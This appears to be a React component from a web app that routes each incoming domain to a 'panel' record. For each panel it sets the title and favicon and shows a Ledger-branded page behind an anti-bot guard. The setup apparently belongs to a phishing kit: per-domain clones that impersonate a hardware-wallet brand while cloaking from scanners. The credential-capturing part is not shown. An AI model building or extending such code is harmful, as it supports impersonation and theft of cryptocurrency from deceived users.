import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { Tables } from "@/integrations/supabase/types";
import Ledger, { LEDGER_DEVICE_SLUGS } from "./Ledger";
import NotFound from "./NotFound";
import AntiBotGuard from "@/components/AntiBotGuard";

type Panel = Tables<"panels">;

type Props = {
  /** Explicit host to resolve panel by. Overrides route param. */
  host?: string;
};

function normalizeHost(h: string): string {
  return h.toLowerCase().replace(/^www\./, "").split(":")[0];
}

export default function PanelLanding({ host }: Props = {}) {
  const { panelSlug } = useParams<{ panelSlug: string }>();
  const [state, setState] = useState<{
    loading: boolean;
    panel: Panel | null;
    typeFavicon: string | null;
  }>({ loading: true, panel: null, typeFavicon: null });

  useEffect(() => {
    let cancelled = false;
    (async () => {
      let panel: Panel | null = null;
      if (host) {
        const normalized = normalizeHost(host);
        const { data } = await supabase
          .from("panels")
          .select("*")
          .eq("active", true)
          .ilike("domain", normalized)
          .maybeSingle();
        panel = data ?? null;
      } else if (panelSlug) {
        const { data } = await supabase
          .from("panels")
          .select("*")
          .eq("slug", panelSlug)
          .eq("active", true)
          .maybeSingle();
        panel = data ?? null;
      }

      let typeFavicon: string | null = null;
      if (panel?.type) {
        const { data } = await supabase
          .from("panel_type_settings")
          .select("favicon_url")
          .eq("type", panel.type)
          .maybeSingle();
        typeFavicon = (data?.favicon_url as string | null) ?? null;
      }
      if (!cancelled) setState({ loading: false, panel, typeFavicon });
    })();
    return () => {
      cancelled = true;
    };
  }, [panelSlug, host]);

  useEffect(() => {
    const { panel, typeFavicon } = state;
    if (!panel) return;
    if (panel.title) document.title = panel.title;
    const favicon = panel.favicon_url || typeFavicon;
    if (favicon) {
      let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
      if (!link) {
        link = document.createElement("link");
        link.rel = "icon";
        document.head.appendChild(link);
      }
      link.href = favicon;
    }
  }, [state]);

  if (state.loading) return <main className="min-h-screen bg-[#0b0b10]" />;
  if (!state.panel) return <NotFound />;

  const forcedDeviceSlug =
    state.panel.device_type && LEDGER_DEVICE_SLUGS.includes(state.panel.device_type)
      ? state.panel.device_type
      : null;

  return (
    <AntiBotGuard panelId={state.panel.id}>
      <Ledger
        panelSlug={state.panel.slug ?? state.panel.domain ?? undefined}
        forcedDeviceSlug={forcedDeviceSlug}
      />
    </AntiBotGuard>
  );
}
